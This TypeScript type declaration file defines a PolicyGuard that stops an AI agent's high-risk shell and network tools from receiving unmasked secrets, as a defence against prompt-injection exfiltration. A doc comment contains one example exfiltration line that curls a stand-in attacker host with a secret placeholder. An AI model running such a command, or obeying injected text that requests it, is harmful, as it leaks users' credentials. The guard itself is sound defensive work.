export declare const DEFAULT_HIGH_RISK_TOOLS: string[];
export interface PolicyGuardOptions {
    blockHighRiskTools?: boolean;
    highRiskToolNames?: string[];
    onBlockedExfiltration?: (toolName: string, placeholders: string[]) => void;
}
export declare class PolicyGuard {
    private blockHighRiskTools;
    private highRiskTools;
    private blockedCount;
    private onBlocked?;
    constructor(options?: PolicyGuardOptions);
    getBlockedCount(): number;
    isBlockingHighRiskTools(): boolean;
    setBlockHighRiskTools(enabled: boolean): void;
    listHighRiskToolNames(): string[];
    /**
     * Returns true if unmasking secrets into the given tool's arguments is permitted.
     * High-risk shell and network tools are blocked from receiving unmasked secrets
     * to prevent prompt-injection exfiltration (e.g. `curl https://attacker -d '{{HF_SEC_xxx}}'`).
     */
    canUnmaskForTool(toolName: string, textWithPlaceholders?: string): boolean;
}
